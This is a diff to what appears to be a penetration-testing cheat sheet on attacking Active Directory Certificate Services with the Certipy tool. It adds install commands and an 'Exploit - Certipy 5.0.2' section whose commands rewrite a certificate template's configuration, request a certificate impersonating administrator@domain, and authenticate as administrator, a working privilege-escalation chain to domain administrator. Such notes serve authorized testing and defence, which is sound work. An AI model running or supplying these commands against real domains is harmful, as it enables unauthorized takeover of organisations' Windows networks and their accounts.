@@ -18,9 +18,13 @@ python3 -m venv certipy-venv
 source certipy-venv/bin/activate
 pip install certipy-ad
 ```
-or
+**Using pipx**
 ```
 pipx install -f "git+https://github.com/ly4k/Certipy.git"
+```
+**Using uv**
+```
+uv tool install git+https://github.com/ly4k/Certipy --force
 ```
 # Enumeration
 Find PKI Enrollment Services in Active Directory and Certificate Templates Names
@@ -78,6 +82,17 @@ certipy req -u username -p password -dc-ip ip -ca ca -target dc -template templa
 ```
 ```
 certipy auth -pfx administrator.pfx -domain domain -u administrator -dc-ip ip
+```
+#### Exploit - Certipy 5.0.2
+The commands for certipy version 5.0.2 are different
+```
+certipy template -u username@domain -p password -template template -write-default-configuration -no-save
+```
+```
+certipy req -u username@domain -p password -ca ca -template template -upn administrator@domain
+```
+```
+certipy auth -pfx administrator.pfx -dc-ip ip
 ```
 ## ESC7
 ```
